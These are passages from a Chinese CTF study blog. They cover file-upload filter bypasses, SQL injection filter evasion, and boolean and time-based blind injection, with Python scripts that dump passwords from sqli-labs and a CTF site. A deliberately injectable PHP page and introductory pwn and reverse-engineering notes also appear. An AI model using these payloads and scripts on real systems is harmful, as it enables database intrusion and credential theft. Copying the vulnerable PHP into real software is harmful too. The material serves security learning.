特殊文件名绕过（只适用windows，将文件名改为evil.php.或evil.php（注意这里有一个空格)。在windows下，不允许这样的命名，所以会将.和空格自动去掉）。 0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件 白名单检测接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传 绕过： 0x00阶段绕过 解析漏洞绕过 （1）apache解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为php文件，不能解析jpg会向前解析php （2）IIS6.0目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。 （3）IIS6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型 （4）Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上eval.php.jpg，如evil.jpg/.php，evil.jpg会解析为php的格式 服务端文件内容检测 图像类文件内容检测 文件幻数检测（图片头格式检测） jpg内容头value = FF D8 FF E0 00 10 4A 46 49 46 gif内容头value = 47 49 46 38 39 61 png内容头value = 89 50 4E 47 绕过：在文件头后加上一句话木马就能绕过 Upload-Labs分别对客户端javascript检测、服务端MIME类型检测、服务端目录路径检测三种不同类型的绕过进行练习。 这里有个坑。经过潘大佬的测试，上传文件超过了文件大小php.ini中即系统设定的大小。php.ini中的配置原本为upload_max_filesize = 2M，修改为upload_max_filesize = 20M。然后就可以上传文件了。 pass-01源码： 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以知道此处的过滤是通过javascript实现的，在开发者工具中禁用js就可以上传木马 pass-02源码： 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！'; &#125;&#125; 这里对文件MIME类型进行了限制，只需要用burpsuite抓包后，将Content-Type修改为image/jpeg或image/gif或image/png，放包后上传成功 pass-11源码： 1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = '上传失败！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 这里由于有jpg、png、gif的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过%00对后面的后缀名截断 实验吧之上传绕过bypass the upload格式：flag{}解题链接 0x00截断上传12345&lt;%path=\"upfiles/picture/\"file=\"20180321.jpg\"upfilename=path &amp; file '最后的上传地址%&gt; upfilename即为最终名字，意思为如果地址为picture/1.php+，文件名为1.jpg则最终上传上去的文件路径为picture/1.php+1.jpg。0x00截断的思路即为将+之后的内容忽略掉使上传文件1.jpg最终上传到1.php中。 先随便上传一个图片文件，提示需要上传php文件。同样上传php文件，提示需要上传其他格式文件。 这里就需要用到0x00截断。提交图片后使用burpsuite抓包，在/uploads/后面加上1.php+。 然后在hex里把+对应的十六进制改为00。 修改完成后得到flag。 参考网站http://www.php.cn/php-weizijiaocheng-359309.htmlhttps://blog.csdn.net/zhanghw0917/article/details/46793847https://www.cnblogs.com/bmjoker/p/9141322.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"WEB入门（二）","slug":"WEB入门（二）","date":"2018-07-04T05:50:22.000Z","updated":"2019-02-28T07:38:11.749Z","comments":true,"path":"2018/07/04/WEB入门（二）/","link":"","permalink":"https://qianfei11.github.io/2018/07/04/WEB入门（二）/","excerpt":"今天学姐复习了前天的数字型和字符型注入，讲了SQL注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。","text":"今天学姐复习了前天的数字型和字符型注入，讲了SQL注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。 带过滤的SQL注入SQL注入的过程中有些特定的字符或者字符串会被过滤，数据库无法了解正确的查询语句。 如何绕过过滤运用编码技术绕过 ASCII码 97, 115, 116)```即等价于```east```12342. URL编码```0x61646D696E```即等价于```admin 重复例如： 12seleselectctadmadminin 大小写交替例如： 12SeLEctUnIOn 空格的绕过 用两个空格或者TAB代替 %a0代替 /**/代替 用括号()代替 用+代替 用花括号{}代替 用单引号或双引号代替 关键表名过滤绕过information_schema(这里空格).(这里空格)tables 过滤等号用like可以替代 过滤引号123456789101112131415## 过滤大于小于号函数greatest()和least()分别替代(&gt;)和(&lt;)例如：```sqlselect * from users where id=1 and ascii(substr(database(),1,1))&gt;64``` 等价于```sqlselect * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64 过滤逗号from 1 for 1)```1234## SLEEP函数中不能用数字用pi()和ceil()过滤 sleep(ceil(pi()))1234## 过滤注释符（#、--+）用闭合的方式： 1’ and ‘112345678910## 宽字节注入在MYSQL中是用GBK编码时，会认为两个字符为一个汉字。宽字节注入即通过增加一个字符来过滤掉转义字符前的反斜杠比如“\\&apos;”的urlencode编码为%5c%27，在前面加上%df，会使得%df%5c构成一个汉字，%27则作为一个单独的单引号## order by被过滤使用into变量来绕过： select * from users limit 1,1 into @a,@b,@c1234567891011121314151617在本地一张有六个字段的表中测试：![当字段数不匹配时会报错](/pics/WEB集训/二/1.png)![匹配时不会报错](/pics/WEB集训/二/2.png)## 利用等价函数&gt; * hex()、bin() ==&gt; ascii()&gt; * sleep() ==&gt; benchmark()&gt; * concat_ws() ==&gt; group_concat()&gt; * mid()、substr()==&gt; substring()&gt; * @@user ==&gt; user()&gt; * @@datadir ==&gt; datadir()## MYSQL条件注释利用 /!../12以上语句在其他数据库中不执行，但在MYSQL中执行 /!50000…/123456以上语句在50000版本以上不执行，否则必执行，用于过滤正则表达式# 盲注铁盆对SQL回显注入的解释： 我问你叫什么名字，你回答你叫奥特曼。123456789101112131415而SQL盲注是相反的，即不直接显示搜索到的结果，而从其他方式来推断得出结果的SQL注入SQL盲注常用函数：&gt; * if和case when：用于时间盲注&gt; * substring、substr、mid等：用于截断字符串&gt; * ascii：使字符变成ASCII码&gt; * limit offset：用于猜取内容## 布尔盲注即只有TRUE和FALSE两种状态，过程中需要猜测，直到正确为止铁盆箴言： 我问你叫什么名字，你只会说是和不是(ture false)。于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。1234561. 判断是否有盲注点```mysql1&apos; and 1=1 # 返回TRUE1&apos; and 1=2 # 返回FALSE，并且没有返回 即SQL语句执行成功和失败的返回界面存在某种固定的差异 猜解库名、表名、列名、内容 12341&apos; and substr(database(),1,1)=&apos;a&apos; # 猜解库名1&apos; and substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos; # 猜解表名1&apos; and substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos; # 猜解列名1&apos; and substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos; # 猜解表名 以上即为基本的猜解过程 时间盲注即对一个命令只有一个固定的反应，如果是正确的就会等待一定的时间再反应，如果错误立即反应 铁盆箴言： 12我问你叫什么名字，无论对错，你只会 啊 的叫一声。于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。 判断是否有盲注点 121&apos; and if(1=1,sleep(5),1) # 延迟返回为TRUE1&apos; and if(1=2,sleep(5),1) # 不延迟返回为FALSE 基本与布尔盲注类似。 猜解库名、表名、列名、内容 12341&apos; and if((substr(database(),1,1)=&apos;a&apos;),sleep(5),1) # 猜解库名1&apos; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # 猜解表名1&apos; and if((substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # 猜解列名1&apos; and if((substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos;),sleep(5),1) # 猜解表名 以上即为基本的猜解过程。 DVWA之SQL Injection上课没有认真听，DVWA安全级别一直开在high，试了好久都做不出。下面就记录一下解题过程。 判断注入类型 判断字段数 猜解库名、表名、列名 获取密码 题目源码12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,\"first_name\"); $last = mysql_result($result,$i,\"last_name\"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; SQL-LABS-MASTER这里有个很大的坑。因为自己是在虚拟机上跑的PHPSTUDY，想用脚本跑盲注的时候觉得有点麻烦，就直接用女朋友的电脑了。但是在女朋友的电脑上发现开不了APACHE，只能用NGINX，然后就发现各种脚本跑不出，手注也不行，但是在别人的电脑上明明能跑啊。 还好有牛逼的啦啦大哥哥帮忙才发现了漏洞。 在PHP的配置文件php-ini中发现参数agc_quotes_gpc是on的，即会对注入时的单引号进行转义，原本的注入点就很难被注入。修改成off之后即可 less-5根据测试可以判断这里为布尔盲注 脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-5/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr(database(),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # 库名：security # get_tables() # 表名：emails;referers;uagents;users # get_columns() # 列名：1.id;email_id 2.id;referer;ip_address 3.id;uagent;ip_address;username 4.id;username;password # 根据以上的结果可以认为需要找的东西在users表中的password字段 get_flag() # dumb;i-kill-you;p@ssword;crappy;stupidity;genious;mob!le;admin;admin1;admin2;admin3;dumbo;admin4 最后看一看网页源码，其实实现还是很简单的 less-9根据测试判断为时间盲注 脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-9/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr(database(),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='uagents' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # 库名：security # get_tables() # 列名：emails;referers;uagents;users # get_columns() # 表名：1.id;email_id 2.id;referer;ip_address(ip_addkess) 3.id;uagent;ip_address;username 4.id;username(usernahe);password(passkord) # 由于时间盲注会受到网络的影响，需要多试几次来提高结果的精确度 # 根据以上的结果可以认为需要找的东西在users表中的password字段 get_flag() # dumb;i0kill-you;p@ssword;crappyustupidity;genious;mob!le;admie;admin1;admin2;admin3;dumbo0dmin4 源码如下： less-25就是过滤了AND和OR，其他的话和DVWA的LOW LEVEL SQL INJECTION是一样的 这里information_schema库名中也有or，要记得双写 password中的or也会被过滤 less-26已经能猜到表中有三个字段，所以就不测字段，然后用%A0替代空格，用%26%26(&amp;&amp;)替代AND，写出payload： 10%27%A0union%A0select%A01,database(),3%26%26%271 因为注释符都被过滤了，所以语句最后通过加上“and ‘1”来绕过 网页源码是这样的，过滤了好多东西： less-27用大小写交替来绕过过滤，其他过滤和上一题相同，于是直接写出payload： 10%27uNion%a0SeleCt%a01,database(),3%a0%26%26%271 网页源码： 实验吧简单的sql注入简单的sql注入通过注入获得flag值（提交格式：flag{}）。解题链接 这里过滤了很多关键字，需要尝试多次以后才能构造出正确的payload。以下为每一步的payload。 获取库名： 1' unionunion selectselect database() ' 获取表名： 1' unionunion selectselect table_name fromfrom information_schema.tables wherewhere table_table_schemaschema='web1 获取列名： 1' unionunion selectselect column_namcolumn_namee fromfrom information_schema.coluinformation_schema.columnsmns wherewhere table_table_schemaschema='web1' andand table_name='flag 得到flag： 1' unionunion selectselect flag fromfrom web1.flag wherewhere '1'='1 简单的sql注入3mysql报错注入格式：flag{}解题链接 依次输入1 and 1=1和1 and 1=2，发现存在布尔盲注。 经过上一题直接猜测表名为flag（如果和上一题一样就可以直接写爆破flag的脚本了），返回hello，说明确实有flag这个表。那么就可以直接写脚本爆破了。 直接爆破flag表flag字段得到flag。脚本如下： 12345678910111213141516171819import requests, repayload = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;_!@#$^&amp;*().-\"url = \"http://ctf5.shiyanbar.com/web/index_3.php\"def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"?id=1' and (select flag from flag) like '&#123;&#125;&#123;&#125;%'%23\".format(name, ch) r = requests.get(url + sql) if r.text.find('Hello!') != -1: res += ch print(res) break print(\"flag: \" + res)if __name__ == '__main__': get_flag() 参考网站https://www.2cto.com/database/201607/529000.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"PWN入门（一）","slug":"PWN入门（一）","date":"2018-07-03T02:32:36.000Z","updated":"2019-02-28T05:57:26.679Z","comments":true,"path":"2018/07/03/PWN入门（一）/","link":"","permalink":"https://qianfei11.github.io/2018/07/03/PWN入门（一）/","excerpt":"学好二进制必须先打好基础。","text":"学好二进制必须先打好基础。 了解了电脑中的程序如何运行，以及栈在程序运行时是如何变化的。 程序运行基本原理CPU访问快慢的速度依次为：寄存器-&gt;缓存-&gt;内存-&gt;硬盘。 硬盘用于永久存储所有的数据。当程序运行时，程序内容会被放进内存中，占用内存的空间。缓存和寄存器则相对速度更快，作为数据和CPU之间连接的桥梁。 寄存器CPU内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。和CPU速度相当，空间比较小在kb级别。CPU访问寄存器的速度是最快的。寄存器是一种容量有限的存储器，并且非常小，因此只把一些计算机的指令等一些计算机频繁用到的数据存储在其中，加快直接同内存读取指令和读写数据的速度。 缓存（CACHE）存在于内存与CPU之间的存储器，容量比较小但速度比内存高得多，接近于CPU的速度，比寄存器要慢1倍左右，但是空间可以达到MB级别。高速缓存在CPU要频繁访问内存中的一些数据时，如果每次都从内存中去读，花费的时间会更多，因此在寄存器和内存之间有了缓存，把CPU要频繁访问的一些数据存储在缓冲中，这样效率就会更高。但需要注意的是，缓冲的大小也是很小的，不能存放大量的数据。缓存又可以分为一级和二级缓存，一级的速度大于二级的速度。CPU向内存读取数据时，首先查询缓存区是否有对应数据，如果有则直接读取，没有再从内存中读取。 内存计算机运行过程中的存储主力，用于存储 指令（编译好的代码段），运行中的各个静态，动态，临时变量，外部文件的指针等等。寄存器和高速缓存只是加速存储速度的中间部件，原始运行文件都是先加入到内存中，因此内存的大小决定了一个可运行程序的最大大小。速度比缓存要慢10倍左右，但是空间可以达到GB级别，当前个人电脑一般都不小于4G。分为只读（ROM）和随机存储器（RAM）。 硬盘用来存储需要永久存储的文件，归入外存储器，访问速度比内存要慢上万倍，但是价格也比较便宜，空间也很大。 ASCII码 123456#include&lt;stdio.h&gt;int main()&#123; printf(\"%d\\n\", 'A'); printf(\"%c\\n\", 65);&#125; 小端序数据的高位字节存放在地址的高端，低位字节存放在地址的低端 不同类型数据的字节长度 sizeof(int): 4 bit sizeof(short): 2 bit sizeof(float): 4 bit sizeof(double): 8 bit sizeof(char): 1 bit 不同类型数据的小端序存储方式 int 0x12345678: 78 56 34 12 char [] “1234”: 30 31 32 33 00 short 0xdead: ad de short 0x12345678: 34 12 78 56 栈 先进后出 从高地址向低地址延伸 作用： 暂时保存变量 调用函数时传递参数 保存函数返回地址 调试SWAP程序12345678910111213141516#include&lt;stdio.h&gt;void swap(int *aa, int *bb)&#123; int cc = *aa; *aa = *bb; *bb = cc;&#125;int main()&#123; int a = 100, b = 2; swap(&amp;a, &amp;b); printf(\"%d %d\\n\", a, b); return 0;&#125; 表格模拟程序执行时的栈： ADDRESS VALUE NAME 0x7ffee7574978 2 b 0x7ffee7574974 100 a 0x7ffee7574970 0x7ffee7574978 bb 0x7ffee757496c 0x7ffee7574974 aa 0x7ffee7574968 ?? cc 流程图模拟程序执行时的栈： 以下为在mac下反汇编出的代码，基本和linux下的一致，但是和windows下的有一定区别： 12345678910111213141516 0x10958ff10 &lt;+0&gt;: pushq %rbp 0x10958ff11 &lt;+1&gt;: movq %rsp, %rbp 0x10958ff14 &lt;+4&gt;: movq %rdi, -0x8(%rbp) 0x10958ff18 &lt;+8&gt;: movq %rsi, -0x10(%rbp)-&gt; 0x10958ff1c &lt;+12&gt;: movq -0x8(%rbp), %rsi 0x10958ff20 &lt;+16&gt;: movl (%rsi), %eax 0x10958ff22 &lt;+18&gt;: movl %eax, -0x14(%rbp) 0x10958ff25 &lt;+21&gt;: movq -0x10(%rbp), %rsi 0x10958ff29 &lt;+25&gt;: movl (%rsi), %eax 0x10958ff2b &lt;+27&gt;: movq -0x8(%rbp), %rsi 0x10958ff2f &lt;+31&gt;: movl %eax, (%rsi) 0x10958ff31 &lt;+33&gt;: movl -0x14(%rbp), %eax 0x10958ff34 &lt;+36&gt;: movq -0x10(%rbp), %rsi 0x10958ff38 &lt;+40&gt;: movl %eax, (%rsi) 0x10958ff3a &lt;+42&gt;: popq %rbp 0x10958ff3b &lt;+43&gt;: retq Linux下采用的是AT＆T的汇编语法格式，Windows下面采用的是Intel汇编语法格式。二者的主要区别在于： 指令操作数的赋值方向是不同的 Intel：第一个是目的操作数，第二个是源操作数 AT＆T：第一个是源操作数，第二个是目的操作数 指令前缀 AT＆T：寄存器前边要加上％，立即数前要加上$ Intel：没有这方面的要求 内存单元操作数 Intel：基地址使用[] AT&amp;T：基地址使用() 比如：intel中mov ax, [bx]；AT&amp;T中movl (%eax), %ebx 操作码的后缀 AT&amp;T中操作码后面有一个后缀字母: l 32位, w 16位, b 8位 Intel却使用了在操作数前面加dword ptr, word ptr, byte ptr的格式 例如: mov al, bl(Intel)；movb %bl, %al(AT&amp;T) AT＆T中跳转指令标号后的后缀表示跳转方向，f表示向前，b表示向后 参考网站https://blog.csdn.net/sinat_37138973/article/details/79012270https://blog.csdn.net/younkerjqb/article/details/53432422https://blog.csdn.net/chuchus/article/details/38469403","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"WEB入门（一）","slug":"WEB入门（一）","date":"2018-07-02T04:38:52.000Z","updated":"2019-02-03T09:45:39.899Z","comments":true,"path":"2018/07/02/WEB入门（一）/","link":"","permalink":"https://qianfei11.github.io/2018/07/02/WEB入门（一）/","excerpt":"今天上午是葛大佬的课，继续好好做笔记。","text":"今天上午是葛大佬的课，继续好好做笔记。 对数据库的概念更清楚了，通过自己搭建一个有注入的网页对PHP和HTML的基本函数有了更好的理解。 PHPPHP脚本以123456789## 注释```PHP// 单行注释# 单行注释/*多行注释*/ 变量规则 变量以$符号开头 变量名称必须以字母或下划线开头 变量名称不能以数字开头 变量名称只能包含字母数字字符和下划线（A-Z、a-z、0-9以及_） 变量名称对大小写敏感 1234567&lt;?php $a = 'I am a'; $b = 'I am b'; echo '$a'; echo '&lt;br&gt;'; echo \"$b\";?&gt; 三层架构中的信息流 URL统一资源定位符，提供资源（通常是文档）的路径或位置。结构如下： 1协议://授权/路径?查询 GET请求和POST请求HTTP中定义的客户端可以发送服务器的两种操作 GET从服务器查询数据方式：用?分割url和查询的数据 POST向服务器传递数据方式：通过form表单传递 PHP与MYSQLGET方法传递参数12345678&lt;?php$id=$_GET['id'];if(!is_numeric($id))&#123; echo \"U r a hacker!&lt;br&gt;\";&#125;else&#123; echo \"Connecting database!&lt;br&gt;\";&#125;?&gt; PS：123456789## POST方法传递参数```php&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;Pls input ur id: &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;U r NO.&lt;?php echo $_POST[&apos;id&apos;]; ?&gt; visitor! 与mysql相关函数连接数据库username, password);```12345678910参数|描述:-:|:-:servername|可选。规定要连接的服务器，默认是“localhost:3306”username|可选。规定登陆所使用的用户名，默认是拥有服务器进程的用户名的名称password|可选。规定登陆所用的密码，默认是“”### 选取数据```mysql_query(query, connection); 参数 描述 query 必需。规定要发送的sql查询 connection 可选。规定sql连接标识符 设置活动的数据库connection);```123456789参数|描述:-:|:-:database|必需。规定要选择的数据库connection|可选。规定mysql连接，如未指定，使用上一个连接### 获取数据```mysql_fetch_array(data, array_type); 参数 描述 data 可选。规定要使用的数据指针 array_type 可选。规定返回结果 MYSQL命令行指令更改密码12update mysql.user set password=password('test') where username='root';flush privileges; 查看数据库1show databases; 选择数据库1use mysql; 查看当前数据库所有数据表1show tables; 查看某张表所有字段信息1desc users; 创建数据库1create database mysql; 删除数据库1drop database mysql; 创建表名为users的数据表（其中id为主键自增）123456create table users( id int auto_increment, username varchar(20), password varchar(50), primary key (`id`)); 修改表名1alter table users rename to users2; 往表中插入数据1insert into users(...) value(...); 查询表中字段的数据类型1show create table mysql; MYSQL相关命令及注释命令 AND：所有由AND连接的条件都为TRUE，SQL语句才执行 OR：只要OR连接的条件里有一个是TRUE，SQL语句就会执行 UNION SELECT：联合查询 GROUP BY：表示按照第几列进行排序 GROUP_CONCAT：将查询结果以一行的形式输出 注释12345-- 单行注释# 单行注释/*多行注释*/ SQL手注练习 判断有无注入点 判断注入类型 判断表中字段数 UNION查询库名 UNION查询表名 UNION查询字段名 UNION查询内容（得到flag） 自己搭建一个POST方式的字符型SQL注入网站本地数据库如下： 源码如下： 1234567891011121314151617181920212223242526&lt;?PHP$id = $_POST['id'];$conn = mysql_connect('127.0.0.1', 'root', 'root');if($conn)&#123; echo \"Connected success!&lt;br&gt;\";&#125;else&#123; echo \"Connected fail!&lt;br&gt;\";&#125;$db_selected = mysql_select_db('qf', $conn);$sql = \"select * from test1 where id='$id'\";$res = mysql_query($sql, $conn);while($row = mysql_fetch_array($res))&#123; echo \"username: \".$row['username'].\"&lt;br&gt;\"; echo \"age: \".$row['age'].\"&lt;br&gt;\"; echo \"sex: \".$row['sex'].\"&lt;br&gt;\";&#125;mysql_close($conn);echo \"ur sql is:\";echo \"select * from test1 where id='$id'\";?&gt; 1234&lt;form action=\"\" method=\"post\"&gt;Pls input ur id: &lt;input type=\"text\" name=\"id\" /&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"\", value=\"submit\"&gt;&lt;/form&gt; 以下为在本地注入时的过程，与get方式的注入过程没有什么差别，所以省去了判断的过程，直接注入 查询库名 查询表名 查询字段名 查询内容（得到flag）","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"逆向入门（一）","slug":"逆向入门（一）","date":"2018-07-01T05:26:43.000Z","updated":"2019-02-03T09:40:54.973Z","comments":true,"path":"2018/07/01/逆向入门（一）/","link":"","permalink":"https://qianfei11.github.io/2018/07/01/逆向入门（一）/","excerpt":"基础汇编知识以及OD的使用。","text":"基础汇编知识以及OD的使用。 数值表示二进制-b（binary）、十进制-d（decimalism）、十六进制-h（hexadecimal） 字长： bit：位 byte：字节–1byte=8bit word：字–1word=2byte=16bit dword：双字–1dword=2word=4byte=32bit qword：四字–1qword=2dword=4word=8byte=64bit 通用寄存器 EAX：累加器（accumulator），是加法乘法指令的缺省寄存器。还可以用来存储函数返回值 ECX：重复REP和LOOP指令的计数器（counter） EDX：用于存放整数除法产生的余数 EBX：在内存寻址时用来存放基地址（base） ESP：当前线程的栈顶指针，压入栈的数据越多，ESP越小，每入栈一次减小4字节 EBP：当前线程的栈底指针 ESI/EDI：源/目标索引寄存器，字符串操作中，DS:ESI指向源串，ES:EDI指向目标串。 EIP：存放下一个CPU指令的内存地址，执行完后读取下一指令 标志寄存器 CF：进位标志（可检查无符号操作是否溢出） OF：零标志 SF：符号标志 PF：溢出标志（补码溢出） 寄存器寻址 立即数寻址：MOV EAX, 123H 寄存器寻址：MOV EAX, EBX（EBX中存放操作数） 直接寻址：MOV EAX, [12345678H]（操作数以[]为地址） 寄存器间接寻址：MOV EAX, [EBX]（操作数的地址为EBX中存储的值） 基本汇编指令数据传输 指令 作用 MOV 赋值 PUSH 入栈 POP 出栈 LEA 取地址 MOVSX 符号传送 PUSHAD 将所有32位通用寄存器压入栈 POPAD 将所有32位通用寄存器取出栈 算术运算 指令 作用 ADD 加法 INC 自加 SUB 减法 DEC 自减 CMP 比较 MUL 乘法 DIV 除法 IDIV 符号整除 IMUL 符号乘法 NEG 求补 逻辑运算 指令 作用 AND 与运算 OR 或运算 NOT 非运算 XOR 异或运算 TEST 与运算（只对标志位修改，对操作数没有影响） SHL 逻辑左移 SAL 算术左移 SHR 逻辑右移 SAR 算术右移 ROL 循环左移 ROR 循环右移 RCL 进位循环左移 RCR 进位循环右移 转移指令 指令 作用 JMP 跳转 JA 大于时跳转（&gt;） JNA 不大于时跳转（&lt;=） JAE 大于等于时跳转（&gt;=） JB 小于时跳转（&lt;） JNB 不小于时跳转（&gt;=） JBE 小于等于时跳转（&lt;=） JE 相等时跳转（==） JNE 不等于时跳转（!=） JNBE 不小于等于时跳转（&gt;） JG 大于时跳转（有符号）（&gt;） JNG 不大于时跳转（有符号）（&lt;=） JGE 大于等于时跳转（有符号）（&gt;=） JL 小于时跳转（有符号）（&lt;） JNL 不小于时跳转（有符号）（&gt;=） JLE 小于等于时跳转（有符号）（&lt;=） JNGE 不大于等于时跳转（有符号）（&lt;） JNLE 不小于等于时跳转（有符号）（&gt;） JZ 